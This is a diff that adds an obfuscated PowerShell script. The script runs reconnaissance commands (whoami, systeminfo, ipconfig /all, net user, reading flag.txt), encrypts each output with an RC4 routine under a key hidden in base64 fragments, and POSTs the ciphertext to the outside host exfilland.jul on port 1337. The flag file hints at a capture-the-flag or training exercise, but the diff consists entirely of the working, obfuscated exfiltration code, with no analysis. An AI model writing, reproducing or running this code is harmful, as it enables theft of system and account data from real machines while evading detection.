@@ -1,0 +1,73 @@
+  &("SeT-VarIaBlE") w2PrQ ([TypE]("sysTEM.TEXT.ENCoDiNG")  ) ;
+  &"set"  '3azH' (  [TyPe]("coNveRt")) ;
+  Set-Variable -Name COmmanDs -Value (@(
+    "dir",
+    "whoami",
+    "systeminfo",
+    "ipconfig /all",
+    "type flag.txt",
+    "net user"
+))
+
+function eNcRYpt {
+    param (
+        [string]${pLAiNtEXt},
+        [string]${Key}
+    )
+    Set-Variable -Name S -Value (0..255)
+    Set-Variable -Name j -Value (0)
+    Set-Variable -Name KEYBytes -Value (( ."DiR" "varIABLE:W2pRQ")."vALue"::"ascIi".("GetBytes").Invoke(${kEy}))
+    Set-Variable -Name tEXtBYTes -Value ((.("VAriable")  w2PrQ  -vAlUE  )::"aSCii".("GetBytes").Invoke(${pLAINTEXt}))
+
+    for (Set-Variable -Name I -Value (0); ${i} -lt 256; ${i}++) {
+        Set-Variable -Name j -Value ((${J} + ${S}[${i}] + ${KEYBYTES}[${I} % ${KeyByTEs}."LENGTH"]) % 256)
+        ${S}[${I}], ${S}[${j}] = ${S}[${j}], ${s}[${i}]
+    }
+
+    Set-Variable -Name i -Value (0)
+    Set-Variable -Name J -Value (0)
+    Set-Variable -Name CiphERByTES -Value (@())
+    foreach (${ByTE} in ${teXTBYTES}) {
+        Set-Variable -Name i -Value ((${I} + 1) % 256)
+        Set-Variable -Name J -Value ((${j} + ${s}[${i}]) % 256)
+        ${S}[${I}], ${s}[${J}] = ${S}[${j}], ${S}[${I}]
+        Set-Variable -Name K -Value (${s}[(${s}[${I}] + ${s}[${J}]) % 256])
+        Set-Variable -Name cIPhERBYtes -Value (${cIPhERBYtes} + (${BYTE} -bxor ${K}))
+    }
+
+    return  (  .("vArIABle")  ('3azh')  )."VALUe"::"TObase64STRing"(${cIpHeRBYtEs})
+}
+
+function gET-KEy {
+    Set-Variable -Name kEyPARTs -Value (@(
+        "SnVsMw==",
+        "YjRs", 
+        "STN4ZjFs", 
+        "bDRuZCE=" 
+    ))
+    return (${keYPARTs} | .("ForEach-Object") {   ( &("GCI")  vAriAbLe:W2Prq  )."vAlUe"::"AsCIi"."geTsTriNG"( ( &("GEt-vARIablE") ('3AZH') )."vAlUe"::("FromBase64String").Invoke(${_})) }) -join ""
+}
+
+function senD-eXfIl {
+    param (
+        [string]${daTA}
+    )
+    Set-Variable -Name uRi -Value ("http://exfilland.jul:1337")
+    Set-Variable -Name BOdY -Value (@{("{0}{1}" -f'd','ata')=${DAtA};})
+    try {
+        &("{4}{3}{0}{5}{1}{2}"-f'e','WebReques','t','vok','In','-') -Method ("{0}{1}"-f 'POS','T') -UseBasicParsing -Body ${Body} -Uri ${URi} | .("{2}{1}{0}"-f'l','t-Nul','Ou')
+    } catch {
+        &("{2}{0}{1}" -f '-Hos','t','Write') ('Er'+'ror '+'sendi'+'n'+'g '+'d'+'ata '+'t'+'o '+"$Uri")
+    }
+}
+
+foreach (${cMD} in ${COmManDS}) {
+    try {
+        Set-Variable -Name OuTPUt -Value (&("{0}{1}{2}" -f 'cmd','.e','xe') ('/c') ${cmD} 2>&1)
+        Set-Variable -Name eNCRYPTed -Value (.("{0}{2}{1}"-f'Enc','ypt','r') -PlainText ${OUtPUT} -Key $(&("{0}{1}" -f'Ge','t-Key')))
+        &("{2}{0}{1}{3}" -f'-E','x','Send','fil') -Data ${ENCRYPTED}
+    } catch {
+        .("{0}{1}{3}{2}" -f 'Writ','e-H','t','os') ('Erro'+'r '+'e'+'x'+'ecuting '+'comman'+'d'+': '+"$cmd")
+    }
+}
+
